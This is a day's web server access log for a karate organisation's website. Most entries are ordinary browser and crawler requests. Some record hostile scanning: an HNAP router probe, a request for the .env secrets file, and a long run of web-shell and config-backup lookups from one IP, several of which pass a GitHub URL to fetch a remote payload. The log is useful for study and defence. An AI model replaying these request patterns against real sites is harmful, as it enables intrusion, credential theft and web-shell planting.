::ffff:114.119.130.151 - - [26/Sep/2022:00:05:38 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:55 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:56 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:56 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:44:59 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:98.37.56.29 - - [26/Sep/2022:00:45:03 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
::ffff:122.194.11.83 - - [26/Sep/2022:00:52:43 +0000] "POST /HNAP1/ HTTP/1.0" - - "-" "-"
::ffff:114.119.148.169 - - [26/Sep/2022:01:04:20 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:34.77.127.183 - - [26/Sep/2022:01:18:58 +0000] "GET / HTTP/1.1" 200 58140 "-" "python-requests/2.28.1"
::ffff:66.249.69.28 - - [26/Sep/2022:01:19:49 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.69.26 - - [26/Sep/2022:01:19:49 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.135 - - [26/Sep/2022:01:25:43 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:37.139.53.81 - - [26/Sep/2022:01:26:03 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.24 Safari/537.36 Edg/83.0.478.18"
::ffff:37.139.53.81 - - [26/Sep/2022:01:26:04 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.24 Safari/537.36 Edg/83.0.478.18"
::ffff:37.139.53.81 - - [26/Sep/2022:01:26:04 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.24 Safari/537.36 Edg/83.0.478.18"
::ffff:51.222.253.2 - - [26/Sep/2022:01:27:18 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [26/Sep/2022:01:27:20 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [26/Sep/2022:01:27:22 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [26/Sep/2022:01:27:28 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [26/Sep/2022:01:27:28 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [26/Sep/2022:01:27:29 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [26/Sep/2022:01:27:29 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [26/Sep/2022:01:27:30 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [26/Sep/2022:01:27:31 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [26/Sep/2022:01:27:32 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [26/Sep/2022:01:27:33 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [26/Sep/2022:01:27:34 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [26/Sep/2022:01:27:35 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [26/Sep/2022:01:27:36 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [26/Sep/2022:01:27:37 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:45.79.171.66 - - [26/Sep/2022:01:29:33 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:51.222.253.4 - - [26/Sep/2022:01:35:40 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [26/Sep/2022:01:35:41 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [26/Sep/2022:01:35:46 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [26/Sep/2022:01:35:46 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [26/Sep/2022:01:35:47 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [26/Sep/2022:01:35:47 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [26/Sep/2022:01:35:48 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [26/Sep/2022:01:35:48 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [26/Sep/2022:01:35:49 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [26/Sep/2022:01:35:50 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [26/Sep/2022:01:35:51 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [26/Sep/2022:01:35:52 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [26/Sep/2022:01:35:52 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [26/Sep/2022:01:35:53 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [26/Sep/2022:01:35:54 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:95.214.235.205 - - [26/Sep/2022:01:39:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [26/Sep/2022:01:39:40 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.216.35 - - [26/Sep/2022:01:58:36 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:134.122.34.20 - - [26/Sep/2022:02:13:07 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:65.21.246.232 - - [26/Sep/2022:02:24:42 +0000] "GET /style.php HTTP/1.1" 404 148 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:24:44 +0000] "GET /moduless.php HTTP/1.1" 404 151 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:24:47 +0000] "GET /wp-content/plugins/t_file_wp/t_file_wp.php?test=hello HTTP/1.1" 404 181 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:24:49 +0000] "GET /admin.php HTTP/1.1" 404 148 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:24:54 +0000] "GET /index.php?3x=3x HTTP/1.1" 404 148 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:00 +0000] "GET /boom.php?x HTTP/1.1" 404 147 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:02 +0000] "GET /wp-content/plugins/backup_index.php HTTP/1.1" 404 174 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:05 +0000] "GET /wp-content/db_cache.php HTTP/1.1" 404 162 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:11 +0000] "GET /wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1" 404 185 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:13 +0000] "GET /xmlrp.php?url=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 148 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:17 +0000] "GET /wpindex.php?idb=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 150 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:21 +0000] "GET /larva.php?idb=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 148 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:26 +0000] "GET /th3_err0r.php?php=https://raw.githubusercontent.com/carlosdechia/carlosdechia/main/ExV1 HTTP/1.1" 404 152 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:32 +0000] "GET /alfindex.php HTTP/1.1" 404 151 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:36 +0000] "GET /alfa.php HTTP/1.1" 404 147 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:39 +0000] "GET /wp-booking.php HTTP/1.1" 404 153 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:42 +0000] "GET /cindex.php HTTP/1.1" 404 149 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:43 +0000] "GET /wp-content/wp-1ogin_bak.php HTTP/1.1" 404 166 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:49 +0000] "GET /wp-1ogin_bak.php HTTP/1.1" 404 155 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:54 +0000] "GET /wp-includes/fonts/css.php HTTP/1.1" 404 164 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:25:57 +0000] "GET /wp-includes/css/css.php HTTP/1.1" 404 162 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:04 +0000] "GET /old-index.php HTTP/1.1" 404 152 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:07 +0000] "GET /config.bak.php HTTP/1.1" 404 153 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:12 +0000] "GET /wp-admin/config.bak.php HTTP/1.1" 404 162 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:17 +0000] "GET /wp-content/config.bak.php HTTP/1.1" 404 164 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:19 +0000] "GET /wp-includes/config.bak.php HTTP/1.1" 404 165 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:22 +0000] "GET /wp-content/themes/config.bak.php HTTP/1.1" 404 171 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:25 +0000] "GET /wp-content/plugins/config.bak.php HTTP/1.1" 404 172 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
::ffff:207.241.234.64 - - [26/Sep/2022:02:26:28 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "Mozilla/5.0 (compatible; special_archiver/3.1.1 +http://www.archive.org/details/archive.org_bot)"
::ffff:207.241.234.64 - - [26/Sep/2022:02:26:29 +0000] "GET /sfdojo HTTP/1.0" 404 145 "http://karateplus.org/" "Mozilla/5.0 (compatible; special_archiver/3.1.1 +http://www.archive.org/details/archive.org_bot)"
::ffff:65.21.246.232 - - [26/Sep/2022:02:26:31 +0000] "POST /wp-includes/css/wp-config.php HTTP/1.1" 404 169 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
